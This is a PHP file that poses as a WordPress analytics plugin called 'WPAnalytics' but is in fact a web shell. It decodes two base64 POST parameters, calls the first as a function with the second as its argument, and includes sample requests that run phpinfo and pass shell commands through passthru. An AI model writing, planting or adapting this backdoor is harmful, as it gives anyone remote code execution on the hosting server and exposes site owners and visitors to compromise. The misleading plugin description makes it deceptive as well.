<?php
/*
 * WPAnalytics
 * @author            Hudson Nowak
 *
 * @wordpress-plugin
 * Plugin Name:       WPAnalytics
 * Description:       WPAnalytics is a powerful analytics plugin for WordPress that provides you with deep insights into your website's performance and user behavior. With easy-to-read dashboards and comprehensive reports, you can make data-driven decisions to optimize your website's content, improve user engagement, and boost your online presence.
 * Author URI:        https://github.com/nowak0x01/
 * Version:           5.2
 */

	$callback = base64_decode($_POST['K189mD2j']); // Change This
	$code = base64_decode($_POST['OGa93dka']); // Change This

	if(isset($callback) && $callback != "") {

		if($callback === "phpinfo") phpinfo(); // Return phpinfo(); (take a look at disable_functions / environment variables)

		/* Example

			POST /wp-content/plugins/{plugin}/{file}.php
			Host: example.com
			Content-Type: application/x-www-form-urlencoded
			...

			K189mD2j=cGhwaW5mbw==

		*/
	}

	if(isset($code) && $code != "") {
		
		$callback($code);

		/* Example

			POST /wp-content/plugins/{plugin}/{file}.php
			Host: example.com
			Content-Type: application/x-www-form-urlencoded
			...

			K189mD2j=cGFzc3RocnU=&OGa93dka=aWQ7IGxzIC1hbGg=

		*/
	}
